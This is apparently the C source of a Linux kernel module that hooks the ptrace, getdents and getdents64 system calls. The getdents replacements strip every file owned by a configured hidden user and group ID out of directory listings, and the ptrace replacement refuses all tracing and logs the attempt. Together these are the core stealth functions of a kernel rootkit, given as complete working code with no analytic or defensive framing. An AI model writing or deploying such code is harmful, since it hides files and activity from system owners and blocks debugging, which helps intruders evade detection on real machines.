#include "kernel.h"
#include "config.h"
#include <asm/processor.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/compatmac.h>
#include <linux/file.h>
#include <linux/irq.h>

#define DEVPTS_SUPER_MAGIC 0x1cd1

static int new_ptrace (long request, long pid, long addr, long data);
static int new_getdents (unsigned int fd, void *dirent, unsigned int cnt);
static int new_getdents64 (unsigned int fd, void *dirent, unsigned int cnt);

#define _redirect_ptrace 0
#define _redirect_getdents 1
#define _redirect_getdents64 2

redirect_t redirects[]={
	{"ptrace",__NR_ptrace,0,new_ptrace,0}, 
	{"getdents",__NR_getdents,0,new_getdents,0},
	{"getdents64",__NR_getdents64,0,new_getdents64,0},
	{NULL,-1,0,0}
};

int redirect_sz = sizeof(redirects)/sizeof(redirect_t) - 1;
typedef int (*getdents_ptr)(unsigned int,void *, unsigned int);
typedef int (*getdents64_ptr)(unsigned int, void *, unsigned int);

static int
hide_file64 (struct super_block *sb, struct dirent64 *d)
{
	struct inode *		inode;
	int			ret;

	if (sb == NULL || d == NULL)
		return (0);

	if (strcmp(d->d_name, ".") == 0 || strcmp(d->d_name, "..") == 0)
		return (0);

	if ((inode = iget(sb, d->d_ino)) == NULL)
		return (0);

	if (inode->i_uid == HIDE_UID && inode->i_gid == HIDE_GID)
		ret = 1;
	else
		ret = 0;

	iput (inode);
	return (ret);
}


static int
hide_file (struct super_block *sb, struct dirent *d)
{
	struct inode *		inode;
	int			ret;

	if (sb == NULL || d == NULL)
		return (0);

	if (strcmp(d->d_name, ".") == 0 || strcmp(d->d_name, "..") == 0)
		return (0);

	if ((inode = iget(sb, d->d_ino)) == NULL)
		return (0);

	if (inode->i_uid == HIDE_UID && inode->i_gid == HIDE_GID)
		ret = 1;
	else
		ret = 0;

	iput (inode);
	return (ret);
}

static int
strip_hidden64 (struct file *file, unsigned char *tmp_copy, int sz)
{
	struct super_block *	sb;
	struct dirent64 *	dirp, *prev = NULL;
	unsigned char *		p;

	if (file->f_dentry == NULL || file->f_dentry->d_sb == NULL) {
		return (sz);
	}

	sb = file->f_dentry->d_sb;

	/* XXX */
	if (sb->s_magic == DEVPTS_SUPER_MAGIC) {
		return (sz);
	}

	for (p = tmp_copy; p < tmp_copy + sz;) {
		dirp = (struct dirent64 *)p;

		if (hide_file64 (sb, dirp)) {
			if (prev == NULL) {
			} else {
				prev->d_reclen += dirp->d_reclen;
			}
		} else {
			prev = dirp;
		}

		p += dirp->d_reclen; 
	}

	return (sz);
}

static int
strip_hidden (struct file *file, unsigned char *tmp_copy, int sz)
{
	struct super_block *	sb;
	struct dirent *	dirp, *prev = NULL;
	unsigned char *		p;

	if (file->f_dentry == NULL || file->f_dentry->d_sb == NULL) {
		return (sz);
	}

	sb = file->f_dentry->d_sb;

	/* XXX */
	if (sb->s_magic == DEVPTS_SUPER_MAGIC) {
		return (sz);
	}

	for (p = tmp_copy; p < tmp_copy + sz;) {
		dirp = (struct dirent *)p;

		if (hide_file (sb, dirp)) {
			if (prev == NULL) {
			} else {
				prev->d_reclen += dirp->d_reclen;
			}
		} else {
			prev = dirp;
		}

		p += dirp->d_reclen; 
	}

	return (sz);
}

static int
new_getdents64 (unsigned int fd, void *dirent, unsigned int cnt)
{
	unsigned char *		tmp_copy = NULL;
	struct file *		file = NULL;
	getdents64_ptr		f_ptr;
	int			ret;

	f_ptr = (getdents64_ptr)(redirects[_redirect_getdents64].old_address);
	ret = f_ptr(fd,dirent,cnt);
	if (ret <= 0)
		return (ret);

	file = fget(fd);
	if (file == NULL)
		return (-EBADF);
	
	tmp_copy = kmalloc (ret, GFP_KERNEL);
	if (tmp_copy == NULL)
		goto out;

	if (copy_from_user (tmp_copy, dirent, ret)) {
		goto out;
	}
	
	strip_hidden64 (file, tmp_copy, ret);
	copy_to_user (dirent, tmp_copy, ret);

out:
	if (file != NULL) {
		fput (file);
		file = NULL;
	}

	if (tmp_copy != NULL) {
		kfree (tmp_copy);
		tmp_copy = NULL;
	}

	return (ret);
}

static int
new_getdents (unsigned int fd, void *dirent, unsigned int cnt)
{
	unsigned char *		tmp_copy = NULL;
	struct file *		file = NULL;
	getdents_ptr		f_ptr;
	int			ret;

	f_ptr = (getdents_ptr)(redirects[_redirect_getdents].old_address);
	ret = f_ptr(fd,dirent,cnt);
	if (ret <= 0)
		return (ret);

	file = fget(fd);
	if (file == NULL)
		return (-EBADF);

	tmp_copy = kmalloc (ret, GFP_KERNEL);
	if (tmp_copy == NULL)
		goto out;

	if (copy_from_user (tmp_copy, dirent, ret)) {
		goto out;
	}

	strip_hidden (file, tmp_copy, ret);
	copy_to_user (dirent, tmp_copy, ret);

out:
	if (file != NULL) {
		fput (file);
		file = NULL;
	}

	if (tmp_copy != NULL) {
		kfree (tmp_copy);
		tmp_copy = NULL;
	}

	return (ret);
}

static asmlinkage int
new_ptrace (long request, long pid, long addr, long data)
{
	log_current (223);
	return -EPERM;
}

int
init_module (void)
{	
	EXPORT_NO_SYMBOLS;

	if (redirect_init())
		return (-1);

	return (0);
}

int
cleanup_module (void)
{
	redirect_fini();

	return (0);
}

MODULE_LICENSE("Proprietary");
